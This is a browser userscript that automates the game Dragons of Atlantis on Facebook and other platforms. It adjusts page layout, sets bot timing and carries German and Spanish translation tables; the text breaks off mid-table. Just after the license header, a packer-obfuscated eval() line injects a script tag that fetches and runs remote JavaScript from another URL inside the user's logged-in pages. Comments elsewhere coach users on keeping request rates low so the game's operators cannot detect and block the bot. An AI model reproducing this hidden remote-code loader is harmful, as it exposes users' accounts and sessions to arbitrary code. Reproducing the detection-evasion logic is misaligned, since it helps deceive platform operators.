// ==UserScript==
// @name          DoA Power Tools Teamwork Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace     http://wackoscripts.com
// @description   Power Tools for Dragons of Atlantis
// @grant         GM_xmlhttpRequest
// @grant         GM_info
// @grant         GM_setValue
// @grant         GM_getValue
// @match         *://apps.facebook.com/dragonsofatlantis/*
// @match         *://*.castle.wonderhill.com/platforms/*/game
// @match         *://www.kabam.com/dragons-of-atlantis/play 
// @match         *://www.kabam.com/*/dragons-of-atlantis/* 
// @match         *://www.kongregate.com/games/kabam/dragons-of-atlantis
// @match         *://www.kongregate.com/games/kabam/dragons-of-atlantis*
// @match         *://plus.google.com/games/play/659749063556*
// @match         *://*.googleusercontent.com/gadgets/ifr?url=app://659749063556*
// @match         *://*.yahoo.com/game/dragons-of-atlantis*
// @match         *://*.yahooapis.com/*
// @include       *://plus.google.com/games/play/659749063556*
// @include       *://www.kongregate.com/games/kabam/dragons-of-atlantis*
// @include       *://*.googleusercontent.com/gadgets/ifr?url=app://659749063556*
// @include       *://www.kabam.com/dragons-of-atlantis/play
// @include       *://www.kabam.com/*/dragons-of-atlantis/*
// @include       *://apps.facebook.com/dragonsofatlantis/*
// @include       *://*.castle.wonderhill.com/platforms/*/game
// @include       *://*.yahoo.com/game/dragons-of-atlantis*
// @include       *://*.yahooapis.com/*
// @exclude       *://apps.facebook.com/dragonsofatlantis/rubies
// @exclude       *://apps.facebook.com/ai.php*
// @exclude       *://www.facebook.com/plugins/like.php*
// @exclude       *://kabam1-a.akamaihd.net/pixelkabam/*
// @exclude       *://*.akamaihd.net/pixelkabam/*
// @exclude       *://plus.google.com/_/apps-static/*
// @exclude       *://plus.google.com/u/0/_/gadgets/contactPicker*
// @exclude       *://accounts.google.com/*
// @exclude       *://talkgadget.google.com/*
// @exclude       *://www.googleapis.com/static*
// @version       2013.06.08a
// @changelog     <ul><li><b>Added</b> - Yahoo Platform</li><li><b>Changed</b> - Many things in code for wave tab</li><li><b>Changed</b> - Code for Skythrone Outpost</li><li><b>Changed</b> - Code for look/layout</li></ul>
// ==/UserScript==

/********************************************************************************
 * INFORMATION                                                                  *
 *                                                                              *
 * Name: DoA Power Tools Teamwork                                               *
 * Version: 2013.06.08a                                                         *
 * Last Modified: 8 June    2013 22:40  GMT+1                                    *
 * Original Authors: G.Jetson, Runey & Wham                                     *
 * Current  Authors: La Larva, Les, Runey, Lord Mimir, Wham, Didi & Jawz        *
 * Collaborators:                                                               *
 *               AqUaRiUs KaMuS (Site in Spanish)                               *
 *               Tweakit    (Dutch   translator)                                *
 *               Randalph   (French  translator)                                *
 *               Native     (German  translator)                                *
 *               Boaro      (Italian translator)                                *
  *                                                                             *
 * ACKNOWLEDGEMENTS                                                             *
 *                                                                              *
 * DoA Power Tools Teamwork has been written from the ground up and is not      *
 * considered a fork of any other project. However it could never of happened   *
 * without the work done by many scriptwriters on the original DoA Power Tools  *
 * and its many mods.                                                           *
 *                                                                              *
 * DoA Power Tools by George Jetson                                             *
 *  - <http://userscripts.org/scripts/show/102481>                              *
 * DoA Power Tools Plus by Runey                                                *
 *  - <http://userscripts.org/scripts/show/104301>                              *
 * DoA Power Tools Mod by Wham                                                  *
 *  - <http://userscripts.org/scripts/show/103833>                              *
 * DoA Power Tools Teamwork by Runey, Wham, La Larva, Les & Lord Mimir          *
 *  - <http://userscripts.org/scripts/show/114012>                              *
 *                                                                              *
 * DEVELOPMENT                                                                  *
 *                                                                              *
 * If you wish to contribute to the development of DoA Power Tools Teamwork you *
 * can do so at http://wackoscripts.com                                         *
 *                                                                              *
 *                                                                              *
 * If you wish to fork this project then you may do so as long as the following *
 * conditions are met.                                                          *
 *  - The GNU General Public License version 3 or later is used                 *
 *  - All acknowledgements MUST be included in the source code                  *
 *  - A link to the API at MMOG Wiki MUST be included in the source code        *
 *  - It MUST be free (though as per the GNU Public License a small fee for     *
 *    distribution and/or support may be charged)                               *
 *                                                                              *
 * LICENSE                                                                      *
 *                                                                              *
 * Released under the GPL license                                               *
 * http://www.gnu.org/copyleft/gpl.html                                         *
 *                                                                              *
 * This program is free software: you can redistribute it and/or modify it      *
 * under the terms of the GNU General Public License as published by the        *
 * Free Software Foundation, either version 3 of the License, or                *
 * (at your option) any later version.                                          *
 *                                                                              *
 * This program is distributed in the hope that it will be useful, but          *
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY   *
 * or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License     *
 * for more details.                                                            *
 *                                                                              *
 * You should have received a copy of the GNU General Public License along with *
 * this program.  If not, see <http://www.gnu.org/licenses/>.                   *
 ********************************************************************************/
 
 
 
 
 
 
/*                                 A T T E N T I O N
*
*                                  W A R N I N G ! ! !
*
*  Changing some values in this script generates many requests to the server 
*  that are monitored by the game developers.
*  Thats gives them reason to increase the security on your servers.
*  This type of action ( extremely abusive to the servers ) are what make that
*  game developers end up tired and seek more strictest ways to block this script.
*  ( Of which have already implemented some of them )
*            
*	   PLEASE, BE SMART, DON'T HELP THEM TO SEEK WAYS TO BLOCK THIS SCRIPT
*
*                     ( We will end up losing everyone )
*
* The variables involved are:
* -Minimum and maximum between attacks
* -Search radius on the map
* And all the frequencies that include time between requests to the server.
*
* All values we implemented, are thoroughly studied and are there for reasons 
* of logic and common sense, not because we are bad guys.
*
* for example:
* If I were the server administrator, and saw that an IP address with a 
* specific USER_ID is making more than 100 requests in less than an hour over 
* the same action with a frequency of 15 to 20 seconds without stopping, 
* is obviously thats is not a human being.
*/
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))
(function() {
// Check all iframes where the code should not be executed
if (/(pixelkabam|akamaihd|plugins|ai\.php|talkgadget|notifications|contactPicker|accounts|googleapis\.com\/static)/.test(window.location.href)) {
	console.log('call back');
	return;
}

// Check if we are in the right sites (in case of the Metadata Blocks don't work)
if ( !( (/apps\.facebook\.com\/dragonsofatlantis/.test(window.location.href) && /rubies/.test(window.location.pathname) == false) ||
 		/castle\.wonderhill\.com\/platforms\/.+\/game/.test(window.location.href) ||
 		/plus\.google\.com.*\/games\/play\/659749063556/.test(window.location.href)         || 
 		/googleusercontent\.com\/gadgets\/.*\/659749063556/.test(window.location.href)  || 
 		/kabam.com\/dragons-of-atlantis\/play/.test(window.location.href)	||
 		(/kabam.com/.test(window.location.href)	&&
 		 /\/dragons-of-atlantis\/play/.test(window.location.href)
 		)
 		||
 		/kongregate.com\/games\/kabam\/dragons-of-atlantis/.test(window.location.href) ||
 		/yahoo.com\/game\/dragons-of-atlantis/.test(window.location.href) ||
 		/yahooapis.com/.test(window.location.href)
 	)){
 		console.log('call back');
 		return;
}

// TeamWork_jQuery Alias
var $J; 

var SCRIPT_NAME		= 'DoA Power Tools Teamwork';

// Script Version: Year, Month, Day, Revision, Maturity (e.g. YYYY.MMDDa_BETA)
var SCRIPT_VERSION	= '2013.06.08a';

// For Script Mod Authors  ex: (AuthorName Mod)
var SCRIPT_MOD_BY	= '';

// DoA API Version
var API_VERSION		= '?????';

// Generates an ID from the name of the script to be used when data is stored in 
// localStorage to prevent overlap of data between different scripts
var SCRIPT_ID		= (SCRIPT_NAME + SCRIPT_MOD_BY).substr(3).replace(/([a-z]|\s)/g,'');

//"use strict";

/********************************************************************************
 * Check to see if script is running in an iframe or not and removes            *
 * unnecessary elements before continuing.                                      *
 *                                                                              *
 * Current actions:                                                             *
 *  - Set width all parent div of iframe to 100%                                *
 *  - Hide unwanted div in window.top                                           *
 *  - Hide unwanted div in iframe                                               *
 *  - Set width of #content div to 760px                                        *
 *                                                                              *
 * To avoid conflict with other libraries, that may be running on the same      *
 * page, the default alias of $ is changed to $J.                                *
 ********************************************************************************/
function preparePage() {
	$J = TeamWork_jQuery.noConflict();
  var iframe,
  object = '#castlemania_swf',
  platform;

  if ( window.top === window.self ) {
 	
 		//console.log('egal');
		//console.log('window.location.href='+window.location.href);
		if ( window.location.href.indexOf('facebook') !== -1 )
		{
			iframe	 = '#iframe_canvas';
			platform = 'facebook';
		}
		else if ( window.location.href.indexOf("google") !== -1 ) {
			iframe	 = '#oz-gadgets-canvas-iframe-659749063556';
			platform = 'google';
		}
		else if ( window.location.href.indexOf("kabam.com") !== -1 ) {
			iframe	 = '#game_frame';
			platform = 'kabam';
		}
		else if ( window.location.href.indexOf("kongregate.com") !== -1 ) {
			iframe	 = '#gameiframe';
			platform = 'kongregate';
		}
		else if ( window.location.href.indexOf("yahoo.com") !== -1 ) {
			iframe	 = '[id^=yap-iframe-mDuFjS4e]';
			platform = 'yahoo';
		}
	
 		//console.log('platform='+platform);
		//console.log('iframe='+iframe);

   function setWide() {    
      clearTimeout;
 		//console.log('$J(iframe).length='+$J(iframe).length);
     if ( $J(iframe).length < 1 )
			{
      	setTimeout(setWide, 100);
        return;
      }
			
			$J(iframe).parents().css({width:'100%',margin:'0',border:'0'});
			
      switch ( platform )
			{
			case 'facebook' :
				$J('#rightCol').css('display', 'none');
				$J('#pagelet_canvas_content').css({width:'1265px'});
				$J('#blueBar').css('position', 'relative');
				$J('#contentCol').css('background','transparent');
				$J('body').css('background', '#888 url(https://kabam1-a.akamaihd.net/wwwkabam/cdn/sites/doa/img/bg_doa.jpg)');
				break;
			case 'yahoo' :
				setTimeout(function(){
					$J(iframe).attr('align','left');
					$J(iframe).css({width:'1265px'});
				},5000);
				$J('#yom-games-gameinfo').css('display', 'none');
				$J('#navigation').css('display', 'none');
				$J('#header').css('display', 'none');
				$J('#yom-games-yap').css('padding', '0');
				$J('#yog-bd').css('padding', '0');
				break;
			case 'google' :
				//try display none element before content
				$J('#content').parent().children().each(function(){
    			if ( $J(this).attr("id") === undefined || $J(this).attr("id") != 'content') {
						$J(this).css('display','none');
						//return false;
					} else {
						//return true;
    			}
				});
				//try display none the elements of all children of 'content' except the iframe
				$J('#content').find('*').each(function(){
    			if ( $J(this).attr("id") === undefined || $J(this).attr("id") !== iframe.slice(1) ) {
						$J(this).css('display','none');
					} else {
						$J(this).parents().each(function(){
							if ( $J(this).attr("id") === undefined || $J(this).attr("id") != 'content' ) {
								$J(this).css('display','');
								$J(this).css('padding','0');
							} else {
								return true;
							}
						});
						//return true;
    			}
				});

				//$J('#pane_hd').css('display', 'none');

				$J('body').css('background', 'transparent');
				$J('body').css('background', '#888 url(https://kabam1-a.akamaihd.net/wwwkabam/cdn/sites/doa/img/bg_doa.jpg)');
				
				break;
				
			case 'kabam' :
				setTimeout (function(){$J('#promo-sidebar').remove();}, 1000);
				setTimeout (function(){$J('#sidebar_container').remove();}, 1000);
				$J(iframe).css({width:'100%',margin:'0',border:'0',backgroundColor:'transparent'});
				break;				
				
			case 'kongregate' :
				$J("#chat_container_cell").remove();
				//$J(".adjusted").css('display', 'none');
				$J("#header_logo").remove();
				$J("#new_nav_wrapper ul.nav-tab-collection").css('display', 'none');
				$J("#header").css({height:'30px'});

				$J(".gamepage_header_outer").css('display', 'none');
				$J("#skin_left_of_game").remove();				
				$J("#maingame").css({width:'1265px',padding:'0px'});
				$J("#game").css({height:'900px'});
				$J('#flashframecontent').css({width:'100%'});
				$J('#maingamecontent.tbody').css({float:'left'});
				setTimeout(function(){
					$J(iframe).attr('align','left');
					$J(iframe).css({width:'100%',height:'100%'});
				},5000);
				
				break;
      }

     }
     setWide();
  }
	else {
		
 		//console.log('not egal');
		//console.log('window.location.href='+window.location.href);
		platform = document.body.className.split(' ');
		//console.log('document.body.className='+document.body.className);
		if (platform && platform[0]){
			platform = platform[0].replace(/(platforms_|_game)/g,'');
		} else {
			platform = 'google';
		}
		//console.log('platform='+platform);
		//console.log('iframe='+iframe);
	
		var errors = 0;
    function setHigh() {

		//console.log('2 window.location.href='+window.location.href);
		//console.log('2 window.location.href.indexOf("yahooapis")='+window.location.href.indexOf("yahooapis"));

      clearTimeout;
 		//console.log('$J(object).length='+$J(object).length);
      if ( $J(object).length < 1 )
			{
				if ($J('#game_frame').length == 1) 
				{	
					$J('#game_frame').css({width:'1265px',height:'900px'});
					//intermediate iframe ... bypass
					return ;
				}
				if ( ++errors > 6 ){
					errors = 0;
					window.location =  window.location.href;
				}
				setTimeout(setHigh, 1000);
        return;
      }
			
			if ( window.location.href.indexOf("kabam.com") !=-1) {
			$J('#container').css({width:'760px',height:'900px'});			
			$J('#castlemania_swf').css({width:'760px'});			
			$J('#castlemania_swf_container').css({width:'760px'});		
			}
			else if ( window.location.href.indexOf("facebook") !=-1 ) {
			$J('#container').css({width:'760px',height:'900px'});
			$J('#castlemania_swf').css({width:'760px'});					
			$J('#castlemania_swf_container').css({width:'760px'});
			}
			else {
			$J('#container').css({width:'760px',height:'900px'});			
			$J('#castlemania_swf').css({width:'760px'});			
			$J('#castlemania_swf_container').css({width:'760px'});
			}

			
      switch (platform)
			{
			case 'facebook' :
				//$J('#hd > div').css('display', 'none');
				$J('#hd > iframe').css('display', 'none');
				$J('#hd > div.facebook_buttons').css('display', 'none');
				$J('#hd > div.#xpromo').css('display', 'none');
				$J('#ft').before($J('#hd'));
				$J('#ft').css('display', 'none');
				$J('body').css('background', 'transparent');
				$J('html').css('background', 'transparent');
				break;
			case 'google' :
				$J('#ft > .current_realm').css({color:'white'});
				$J('#ft > .current_realm.change_realm').css({color:'blue'});
				$J('#ft > .bottom_links').css({display:'none'});
				$J('#pane_hd').css('display', 'none');
				$J('body').css('background', 'transparent');
				$J('body').css('background', '#888 url(https://kabam1-a.akamaihd.net/wwwkabam/cdn/sites/doa/img/bg_doa.jpg)');
				break;
			case 'kabam' :
				setTimeout (function(){$J('#promo-sidebar').remove();}, 1000);
				setTimeout (function(){$J('#sidebar_container').remove();}, 1000);
				$J('html').css({overflow:'hidden',backgroundColor:'transparent'});
				$J('#content').css({width:'100%'});
				break;
			case 'kongregate' :
				$J('html').css({overflow:'hidden',backgroundColor:'transparent'});
				$J('#maingamecontent').css({width:'100%'});
				$J('#maingame').css({width:'1235px'});
				break;
      }
			
			
      initScript(object);
    }
    setHigh();
  }
}



/********************************************************************************
 * Setup global variables that can be used anywhere within the script           *
 *                                                                              *
 * NAMING CONVENTIONS (http://javascript.crockford.com/code.html)               *
 *  - variables and functions should begin with a lowercase letter              *
 *  - constructor functions should begin with a capital letter                  *
 *  - global variable should be all capitals                                    *
 ********************************************************************************/
 
// Constructor function 
var  AutoCollect,
	 Base64,
	 Buildings,
	 Data, 
	 Manifest, 
	 Map,
	 Marches,
	 Units,
	 WackoScript,
	 Sound,
	 Messages,
	 MyAjax,
	 Queue,
	 Seed,
	 Dragons,
	 Tabs = {},
	 Translation,
	 UID = {},
	 UIDN = {};
 
// Global Functions
var translate = actionLog = debugLog = verboseLog = function(){};

// Global Elements
var $startUpBox;

// Global Data Objects
var LANG_OBJECT = {}; 
 
// Unique Identifier
UID = {};
UIDN = {};

function makeUID ( len )
{
	var len = ( len !== undefined ? len : 20);
	var chars = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','u','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','U','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','_'];
	var uid = chars[Math.floor( Math.random() * 54 )];
	for(var i = 0; i < len; i++)
	{
		uid += chars[Math.floor( Math.random() * 64 )];
	}
	return uid;
}

function getUID ( name )
{
	return UID[name] !== undefined ? UID[name] : name;
}

function setUID ( name )
{
	if (UID[name] !== undefined) return UID[name];
	
	var uid = makeUID();
	while ( UIDN[uid] !== undefined )
	{
		uid = makeUID();
	}
	UIDN[uid] = 1;
	UID[name] = uid;
	return uid;
}
 
 

if ( SCRIPT_MOD_BY.length )
{
	String.scriptModBy = SCRIPT_MOD_BY;
}
 
 
 
 
// init PowerTools

function initScript ( SWF_OBJECT )
{


/********************************************************************************
* All global variables MUST be set here or they will not be available to all   *
* functions throughout the script.                                             *
********************************************************************************/

var SCRIPT_URL_ERROR	= 'http://wackoscripts.com';
var SCRIPT_TITLE		= '';


// Tab order
var INFO_TAB_ORDER		= 1;     
var WAVE_TAB_ORDER		= 2;
var ATTACK_TAB_ORDER	= 3;
var JOBS_TAB_ORDER		= 4;
var SENTINEL_TAB_ORDER		= 5;
var ALLIANCE_TAB_ORDER	= 6;
var OPTIONS_TAB_ORDER	= 7;
var LOG_TAB_ORDER		= 99;

// Tab enable/disable
var INFO_TAB_ENABLE		= true;     
var WAVE_TAB_ENABLE		= true;
var ATTACK_TAB_ENABLE	= true;
var JOBS_TAB_ENABLE		= true;
var SENTINEL_TAB_ENABLE		= true;
var ALLIANCE_TAB_ENABLE	= true;
var OPTIONS_TAB_ENABLE	= true;
var LOG_TAB_ENABLE		= true;

// CHECK THESE VARIABLES
var DEBUG_MODE			= false;
var DEBUG_MARCHES		= false;
var ALERT_ON_BAD_DATA	= false;
var SCRIPT_STARTUP_DELAY= Math.randRange(5000, 7000);
var ERROR_509_DELAY     = 900000;
var ERROR_429_DELAY     = 3600000;


var LANG_CODE = navigator.language.substring(0, 2).toLowerCase();
var IS_NOT_NATIVE_LANG = ( LANG_CODE !== 'en' );

var IS_CHROME = navigator.userAgent.toLowerCase().indexOf('chrome') > -1;

// Error messages
var FATAL_SEED_TITLE	= 'ERROR WHILST FETCHING DATA FROM SERVER';
var FATAL_SEED_MSG	= 'Please disable the script and see if you are able to play the game manually. If normal play is possible then enable the script and try again. If the error persists please read the following post before submitting a report. If normal play is not possible then wait until it is and try again. Please try to leave this page open for up to 5 mins <br> Other wise post a report on <a href="http://wackoscripts.com" target="_new">Wackoscripts</a>';
var FATAL_SWF		= '<B>Error initializing:</b><BR><BR>Unable to find SWF element';
var STARTUP_ERROR	= 'Unable to start $SCRIPT_NAME$ <BR>';
var INIT_ERROR		= '<B>Error initializing:</b><BR><BR>';


/* WARNING: Reducing this values cause Too many requests to the server
   that are monitored. Thats gives them reason to increase the security 
   on the servers and, sooner or later, make this scripts unusable.
   PLEASE, BE SMART, DON'T HELP THEM TO SEEK WAYS TO BLOCK THIS SCRIPT. */
var ATTACK_MIN_DELAY	= 25; 

var OUTPOST_TYPE_INDEX  = {};
var CITY_TYPE  = [];

var CITY_DESC = [
	{
		type : 'capital',
		dragon_id : 'Great_Dragon',
		dragon_name : 'GreatDragon',
		outpost_type : 'GreatDragonOutpost',
		outpost_name : 'capital'
	},
	{
		type : 'water',
		dragon_id : 'Water_Dragon',
		dragon_name : 'WaterDragon',
		outpost_type : 'WaterDragonOutpost',
		outpost_name : 'water-outpost'
	},
	{
		type : 'stone',
		dragon_id : 'Stone_Dragon',
		dragon_name : 'StoneDragon',
		outpost_type : 'StoneDragonOutpost',
		outpost_name : 'stone-outpost'
	},
	{
		type : 'fire',
		dragon_id : 'Fire_Dragon',
		dragon_name : 'FireDragon',
		outpost_type : 'FireDragonOutpost',
		outpost_name : 'fire-outpost'
	},
	{
		type : 'wind',
		dragon_id : 'Wind_Dragon',
		dragon_name : 'WindDragon',
		outpost_type : 'WindDragonOutpost',
		outpost_name : 'wind-outpost'
	},
	{
		type : 'ice',
		dragon_id : 'Ice_Dragon',
		dragon_name : 'IceDragon',
		outpost_type : 'IceDragonOutpost',
		outpost_name : 'ice-outpost'
	},
	{
		type : 'swamp',
		dragon_id : 'Swamp_Dragon',
		dragon_name : 'SwampDragon',
		outpost_type : 'SwampDragonOutpost',
		outpost_name : 'swamp-outpost'
	},
	{
		type : 'forest',
		dragon_id : 'Forest_Dragon',
		dragon_name : 'ForestDragon',
		outpost_type : 'ForestDragonOutpost',
		outpost_name : 'forest-outpost'
	},
	{
		type : 'desert',
		dragon_id : 'Desert_Dragon',
		dragon_name : 'DesertDragon',
		outpost_type : 'DesertDragonOutpost',
		outpost_name : 'desert-outpost'
	},
	{
		type : 'chrono',
		dragon_id : 'Chrono_Dragon',
		dragon_name : 'ChronoDragon',
		outpost_type : 'ChronoDragonOutpost',
		outpost_name : 'chrono-outpost'
	},
	{
		type : 'skythrone',
		dragon_id : 'Kaiser_Dragon',
		dragon_name : 'KaiserDragon',
		outpost_type : 'SkythroneOutpost',
		outpost_name : 'skythrone-outpost'
	},
	{
	},
	{
	},
	{
	},
	{
	},
	{
	},
	{
	},
	{
	},
	{
	},
	{
	},
	{
		type : 'spectral',
		dragon_id : 'Spectral_Dragon',
		dragon_name : 'SpectralDragon',
		outpost_type : 'SpectralDragonOutpost',
		outpost_name : 'spectral-outpost'
	},
];



/*******************************************************************************
***************************      TRANSLATIONS      ****************************
*******************************************************************************/
function setLanguage ( locale )
{
LANG_CODE = locale || LANG_CODE;
switch ( LANG_CODE )
{
	/*******************************************************************************
		German ( by Native & Rosebandit)
	*******************************************************************************/
case 'de':
	LANG_OBJECT = {
	'above the first value':'über dem ersten Wert',
	'Action Logs':'Aktion Logs',
	'Actions':'Aktionen',
	'and':'und',
	'Are you sure you want to':'Bist du sicher, dass du',
	'at':'bei',
	'Attack One Target in Waves':'Wellenangriff auf ein Ziel',
	'Attack sent to':'Sende angriffe an',
	'Attacking':'Angriff',
	'Attacks Configuration':'Angriffs-Konfiguration',
	'Attacks Logs':'Angriffs-Logbücher',
	'Attacks stopped momentarily to prevent server blocking':'Angriffe momentan gestoppt, um eine Sperrung durch den Server zu verhindern',
	'Attacks':'Attacken',
	'Auto Refresh every':'Automatisches Auffrischen alle',
	'Automatically':'Automatisch',
	'Awaiting task completion notification':'Erwarte Abschlussbenach-richtigung der Aufgabe',
	'Bandwidth Limit Exceeded':'Bandbreite Grenzwert überschritten',
	'Building':'Gebäude',
	'Busy':'Beschäftigt',
	'Blue Energy':'Blaue Energie',
	'by':'durch',
	'Charging':'Laden',
	'Cities': 'Cities',
	'Clear last attack on all maps':'Lösche letzten Angriff auf allen Karten',
	'Clear last attack on current map':'Lösche letzten Angriff auf ak-tueller Karte',
	'Config':'Konfiguration',
	'Coordinates':'Koordinaten',
	'd':'t',
	'Days':'Tage',
	'Delay Between Attacks':'Verzögerung zwischen den Angriffen',
	'Depending on available population':'Abhängig von verfügbaren Bürgern',
	'Depending on available resources':'Abhängig von verfügbaren Ressourcen',
	'Disabled':'Deaktiviert',
	'Distance must be between':'Entfernung muss zwischen',
	'Distance':'Entfernung',
	'Dont flag Wildernesses':'Markiere keine Wildnisse',
	'Enable':'Aktivieren',
	'Enabled':'Aktiviert',
	'Error':'Fehler',
	'First value must be between':'Erster Wert muss zwischen',
	'Full':'ausgelastet',
	'Game Options':'Spiel Optionen',
	'Going to the coords':'Gehe zu den Koordinaten',
	'h':'h',
	'Hiding':'Verstecken',
	'Hour':'Stunde',
	'Hours':'Stunden',
	'Info':'Info',
	'Invalid Date From':'Ungültiges Datum aus',
	'Invalid Date To':'Ungültiges Datum zu',
	'Invalid delays':'Ungültige Verzögerungen',
	'Invalid number of troops':'Ungültige Anzahl von Truppen',
	'Invalid Range Date':'Ungültige Zeitspanne',
	'Last Attack':'Letzter Angriff',
	'Loaded':'Geladen',
	'Logs':'Logbücher',
	'm':'m',
	'Manual attack sent to':'Manueller Angriff gesendet an',
	'Maximum simultaneous marches':'Maximale Anzahl gleichzeitiger Mär-sche',
	'Maximum Requests per hour':'Maximale Anfragen pro Stunde',
	'Maximum Troops (0 = no max)':'Maximale Truppenanzahl (0 = kein Limit)',
	'miles':'Meilen',
	'Minutes':'Minuten',
	'No targets or troops available':'Keine Ziele oder Truppen verfügbar',
	'No troops available':'Keine Truppen verfügbar',
	'No Troops Defined':'Keine Truppen ausgewählt',
	'Not enough':'Nicht genügend',
	'Not':'Nicht',
	'of inactivity':'der Inaktivität',
	'of':'der',
	'Opening the map on the last position': 'Öffne die Karte auf der letzten position',
	'Options':'Optionen',
	'water_dragon outpost':'Wasser-Außenposten',
	'stone_dragon outpost':'Stein-Außenposten',
	'fire_dragon outpost':'Feuer-Außenposten',
	'wind_dragon outpost':'Wind-Außenposten',
	'ice_dragon outpost':'Eis-Außenposten',
	'swamp_dragon outpost':'Versunkener Tempel',
	'spectral_dragon outpost':'Spectral-Außenposten',
	'Permanent Data':'Dauerhafte Daten',
	'Please wait':'Bitte warten',
	'Preparing Attack':'Vorbereitung des Angriffs',
	'Refresh':'Aktualisieren',
	'Researching':'Forschen',
	'Retry in':'Wiederholen in',
	'Run Time':'Laufzeit',
	's':'sek',
	'Safe Mode':'Sicherer Modus',
	'Scanning Map':'Scanne Karte innerhalb von $NUM$ Meilen <BR> unge-fähre restliche Wartezeit',
	'Script Options':'Skript-Optionen',
	'Search Radius':'Suchradius',
	'Second value must be at least':'Weiter Wert muss mindestens',
	'Seconds':'Sekunden',
	'Send Dragon every certain number of waves':'Sende Drachen bei einer bestimmten Anzahl von Wellen',
	'spectral_dragon outpost':'Spektral-Ruinen',
	'Start Date':'Startdatum',
	'Starting soon':'Start in kürze',
	'Stop if any troops lost':'Stopp bei Truppenverlust',
	'Successfully':'Erfolgreich',
	'Summary':'Übersicht',
	'Targets':'Ziele',
	'Task Completed':'Aufgabe erledigt',
	'Tasks':'Aufgaben',
	'Too many errors,  disabling auto train':'Zu viele Fehler, deaktivere automatische Ausbildung',
	'Too many requests':'Zu viele Zugriffe',
	'Too many troops for muster point level':'Maximale Truppenanzahl laut Truppensammelplatz-Level überschritten',
	'Training Configuration':'Ausbildungs-Konfiguration',
	'Training queue':'Trainings-Warteschlange',
	'Troops for Wave Attack':'Truppen für Wellenangriff',
	'Troops lost':'Truppen verloren',
	'Troops Not Defined':'Truppen nicht definiert',
	'Use the Levels Tab to select attack areas':'Benutze die Level-Tabelle, um Angriffsbereiche auszuwählen',
	'Userset maximum marches reached':'Eingestellte maximale Märsche erreicht',
	'Verbose logging':'Ausführliche Logbücher',
	'Verbose Logs':'Ausführliche Logbücher',
	'Verbose':'Ausführliche',
	'waiting':'warten',
	'Warnings':'Warnung',
	'Wave attack to':'Wellenangriff auf',
	'Wave':'Welle',
	'Window drag':'Fensterverschiebung',
	'Withdraw troops if they are encamped':'Ziehe Truppen zurück, wenn sie lagern',
	'~AquaTroop':'Giftklau',            /* Abbreviation (max. 8 characters) */
	'~ArmoredTransport':'Luftis',       /* idem as above */
	'~BattleDragon':'KampfDr',          /* idem as above */
	'~Conscript':'Rekrut',              /* idem above */
	'~FireDragon':'FeuerDra',           /* idem */
	'~FireMirror':'Feuersp',            /* idem */
	'~FireTroop':'Pyros',               /* idem */
	'~Giant':'Riesen',                  /* idem */
	'~GreatDragon':'GrossDr',           /* idem */
	'~Halberdsman':'Hellebar',          /* idem */
	'~IceDragon':'IceDrg',				/* idem */
	'~Longbowman':'Bogi',               /* idem */
	'~Minotaur':'Mino',                 /* idem */
	'~PackDragon':'PckDrg',             /* idem */
	'~Porter':'Träger',                 /* idem */
	'~Spy':'Spion',                     /* idem */
	'~StoneDragon':'SteinDr',           /* idem */
	'~StoneTroop':'Oger',               /* idem */
	'~SwiftStrikeDragon':'kFD',         /* idem */
	'~WaterDragon':'WasserDr',          /* idem */
	'~WindDragon':'WindDr',             /* idem */
	'~WindTroop':'Banshee',             /* idem */
	'~DarkSlayer':'Dark',             /* idem */
	'~Zzz':'Zzz'
	};
	break;
	/*******************************************************************************
		Español (by La Larva)
	*******************************************************************************/
case 'es':
	LANG_OBJECT = {
	'above the first value':'por encima del primer valor',
	'Action Log':'Reporte de Acciones',
	'Actions':'Acciones',
	'and':'y',
	'Are you sure you want to':'Esta seguro que desea',
	'at':'en',
	'Attack One Target in Waves':'Ataques en Oleadas a Objetivos',
	'Attack sent to':'Ataque enviado a',
	'Attacking':'Atacando',
	'Attacks Configuration':'Configuración de Ataques',
	'Attacks Logs':'Registro de Ataques',
	'Attacks stopped momentarily to prevent server blocking':'Ataques pausados temporalmente para evitar el bloqueo del servidor',
	'Attacks':'Ataques',
	'Auto Refresh every':'Auto Recargar la página cada',
	'Automatically':'Automáticamente',
	'Awaiting task completion notification':'Esperando notificación de finalización de tarea',
	'Bandwidth Limit Exceeded':'Límite de ancho de banda excedido',
	'Building':'Edificando',
	'Busy':'Ocupado',
	'by':'por',
	'Charging':'Cargando',
	'Cities': 'Ciudades',
	'Clear last attack on all maps':'Limpiar todos los registros de últimos ataques',
	'Clear last attack on current map':'Limpiar registro de últimos ataques',
	'Config':'Configuración',
	'Coordinates':'Coordenadas',
	'd':'d',
	'Days':'Día(s)',
	'Delay Between Attacks':'Tiempo de retraso entre ataques',
	'Depending on available population':'En funcion de la poblacion disponible',
	'Depending on available resources':'En funcion de los recursos disponibles',
	'Disabled':'Desactivado',
	'Distance must be between':'La distancia debe estar entre',
	'Distance':'Distancia',
	'Dont flag Wildernesses':'No hacer Desiertos de los terrenos atacados',
	'Enable':'Activar',
	'Enabled':'Activado',
	'Error':'Error',
	'First value must be between':'El primer valor debe ser de',
	'Full':'Lleno',
	'Game Options':'Opciones del Juego',
	'Going to the coords':'Llendo a las Coordenadas',
	'h':'h',
	'Hiding':'Esconder Tropas',
	'Hour':'Hora',
	'Hours':'Hora(s)',
	'Info':'Info',
	'Invalid Date From':'Formato de Fecha de Inicio Invalido',
	'Invalid Date To':'Formato de Fecha de Finalizacion Invalido',
	'Invalid delays':'Intervalo de Retraso Invalido',
	'Invalid number of troops':'Numero invalido de tropas',
	'Invalid Range Date':'Rango de Fecha Invalido',
	'Last Attack':'Último Ataque',
	'Loaded':'Cargado',
	'Logs':'Registros',
	'm':'m',
	'Manual attack sent to':'Ataque Manual enviado a',
